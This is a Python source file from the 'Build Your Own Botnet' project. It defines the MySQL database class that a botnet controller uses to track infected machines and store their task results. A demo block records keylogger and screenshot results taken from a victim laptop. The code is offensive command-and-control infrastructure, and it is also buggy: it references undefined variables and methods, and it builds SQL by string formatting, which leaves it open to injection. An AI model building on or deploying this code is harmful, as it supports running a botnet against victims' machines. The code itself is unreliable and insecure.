#!/usr/bin/python
"""
Build Your Own Botnet
github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library
import os
import json
import time
import Queue
import random
import hashlib
import logging
import colorama
import datetime
import threading
import collections
import mysql.connector

# byob
import util


class DatabaseError(mysql.connector.ProgrammingError):
    pass


class Database(mysql.connector.MySQLConnection):
    """
    Database (Build Your Own Botnet)
    """
    def __init__(self, **kwargs):

        """
        connect to MySQL and setup the BYOB database

            kwargs:

                host        hostname/IP address of MySQL host machine
                            
                user        authorized account username
                    
                password    authorized account password

        """
        super(Database, self).__init__(**kwargs)
        self.config(**kwargs)
        self.logger = util.logger()
        self.tasks  = {}
        self._debug = debug
        self._query = self.cursor(dictionary=True)
        self._queue = Queue.Queue()
        self._color = util.color()
        self._setup(setup)


    def _setup(self):
        try:
            with open('resources/setup.sql', 'r') as fd:
                sql = fd.read().replace('{user}', self.user).replace('{host}', self.server_host)
                self.execute_file(sql)
        except Exception as e:
            raise DatabaseError(str(e))

    def _display(self, data, indent=2):
        if isinstance(data, dict):
            for k,v in data.items():
                if isinstance(v, datetime.datetime):
                    data[k] = v.ctime()
            i = data.pop('id',None)
            print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-3)) if i else None
            for k,v in data.items():
                if isinstance(v, unicode):
                    try:
                        j = json.loads(v.encode())
                        self._display(j, indent+2)
                    except:
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                elif isinstance(v, list):
                    for i in v:
                        if isinstance(v, dict):
                            print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                            self._display(v, indent+2)
                        else:
                            print(colorama.Style.BRIGHT + self._color + str(i).ljust(4  * indent).center(5 * indent))
                elif isinstance(v, dict):
                    print(colorama.Style.BRIGHT + self._color + str(k).ljust(4  * indent).center(5 * indent))
                    self._display(v, indent+1)
                elif isinstance(v, int):
                    if v in (0,1):
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(bool(v)).encode())
                    else:
                        print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                else:
                    print(colorama.Style.BRIGHT + self._color + str(k).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
        elif isinstance(data, list):
            for row in data:
                if isinstance(row, dict):
                    self._display(row, indent+2)
                else:
                    print(colorama.Style.BRIGHT + self._color + str(row).encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + str(v).encode())
                    
        else:
            if hasattr(data, '_asdict'):
                data = data._asdict()
            if isinstance(data, collections.OrderedDict):
                data = dict(data)
            if isinstance(data, dict):
                i = data.pop('id',None)
                print(colorama.Style.BRIGHT + colorama.Fore.RESET + str(i).rjust(indent-1)) if i else None
                self._display(data, indent+2)

            else:
                print(colorama.Style.BRIGHT + self._color + str(data.encode().ljust(4  * indent).center(5 * indent) + colorama.Style.DIM + v.encode()))

            
    def _reconnect(self):
        try:
            self.reconnect()
            self._query = self.cursor(named_tuple=True)
            return "{}@{} reconnected".format(self.database.user, self.database.server_host)
        except Exception as e:
            util.debug("{} error: {}".format(self._reconnect.func_name, str(e)))


    def get_clients(self, verbose=False, display=False):
        """
        Return json list of clients
        """
        clients = self.execute_query("SELECT * FROM tbl_clients ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_clients ORDER BY online desc")   
        if display:
            self._display(clients)
        return clients


    def update_client(self, client_id, online):
        """
        Update client status to online/offline
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE uid='%s'" % (int(online), str(client_id)))
            elif isinstance(client_id, int):
                self.execute_query("UPDATE tbl_clients SET online=%d, last_online=NOW() WHERE id=%d" % (int(online), int(client_id)))
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.offline_client.func_name, str(e)))
            

    def remove_client(self, client_id):
        """
        Remove client from database
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("DELETE FROM tbl_clients WHERE id='%s'" % task_id)
            elif isinstance(client_id, int):
                self.execute_query("DELETE FROM tbl_clients WHERE id=%d" % client_id)
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.remove_client.func_name, list, type(client_id)))
        except Exception as e:
            util.debug("{} error: {}".format(self.remove_client.func_name, str(e)))


    def set_tasks(self, tasks):
        """
        Set types of task results for database to store
        """
        if isinstance(tasks, list) or isinstance(tasks, set):
            self._store_tasks = tasks
        elif isinstance(tasks, dict):
            self._store_tasks = [task for task,value in tasks.items() if value]
        else:
            util.debug("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))


    def get_tasks(self, client_id=None, display=True):
        """
        Get any/all clients task results
        """
        try:
            tasks = None
            if client_id:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks WHERE client='{}'".format(client_id), display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            else:
                try:
                    tasks = self.execute_query("SELECT * FROM tbl_tasks", display=False)
                except Exception as e:
                    util.debug("{} error: {}".format(self.show_results.func_name, str(e)))
            if tasks:
                if display:
                    self._display(tasks)
                return tasks
        except Exception as e:
            util.debug("{} error: {}".format(self.get_tasks.func_name, str(e)))

    def execute_query(self, query, display=False):
        """
        Execute a query and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            result = []
            self._query.execute(query)
            output = self._query.fetchall()
            if output:
                for row in output:
                    if hasattr(row, '_asdict'):
                        row = row._asdict()
                    for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
                        row[key] = value.ctime()
                    if display:
                        self._display(row)
                    result.append(row)
        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
            util.debug(e)
        except Exception as e:
            util.debug("{} error: {}".format(self.execute_query.func_name, str(e)))
        finally:
            return result


    def execute_procedure(self, procedure, args=[], display=False):
        """
        Execute a stored procedure and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            cursor = self.cursor(dictionary=True)
            cursor.callproc(procedure, args)
            result = [row for row in cursor.stored_results() for row in result.fetchall()]
        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
            pass
        finally:
            return result


    def execute_file(self, filename=None, sql=None, display=False):
        """
        Execute SQL commands sequentially from a string or file
        """
        try:
            result = []
            if os.path.isfile(filename):
                with open(filename) as stmts:
                    for line in self._query.execute(stmts.read(), multi=True):
                        result.append(line)
                        if display:
                            print(line)
            elif isinstance(sql, str):
                for line in self._query.execute(sql, multi=True):
                    result.append(line)
                    if display:
                        print(line)
            elif isinstance(sql, list) or isinstance(sql, tuple):
                sql = '\n'.join(sql)
                for line in self._query.execute_query(sql, multi=True):
                     result.append(line)
                     if display:
                         print(line)
            return result
        except Exception as e:
            util.debug("{} error: {}".format(self.execute_file.func_name, str(e)))


    def handle_client(self, client):
        """
        Handle a new/current client by adding/updating database
        """
        args = (json.dumps(client._info), '@client')
        _ = self.execute_procedure('sp_handle_client', args=args, display=False)
        info = self.execute_query('SELECT @client', display=False)
        client._info = info
        if client._info['uid'] not in self.tasks:
            self.tasks[client._info['uid']] = []
        return info
    

    def handle_task(self, task):
        """
        Adds results to database for configured task type
        """
        try:
            if not isinstance(task, dict):
                try:
                    task = json.loads(str(task))
                except:
                    pass
            if isinstance(task, dict):
                args = (json.dumps(task), '@taskid')
                _ = self.execute_procedure("sp_handle_task", args=args)
                task_id = self.execute_query("SELECT @taskid")
                self.tasks[task['client']].append(task_id)
                return task_id
            else:
                util.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
        except Exception as e:
            util.debug("{} error: {}".format(self.handle_task.func_name, str(e)))


if __name__ == '__main__':
    colorama.init()
    d = Database()
    client = {"public_ip": "132.99.245.10", "local_ip": "192.168.1.2", "mac_address": "4D:10:CC:22:09:8D", "platform": "win32", "device": "toms laptop", "username": "tom", "administrator": False, "architecture": 64}
    info,item = d.handle_client(client)
    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "keylogger", "result": "https://pastebin.com/4RcdSls"})
    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "screenshot", "result": "https://i.imgur.com/09FcsdTn"})
    d.get_clients(verbose=True, display=True)
    d.update_client_status(4, 0)
                
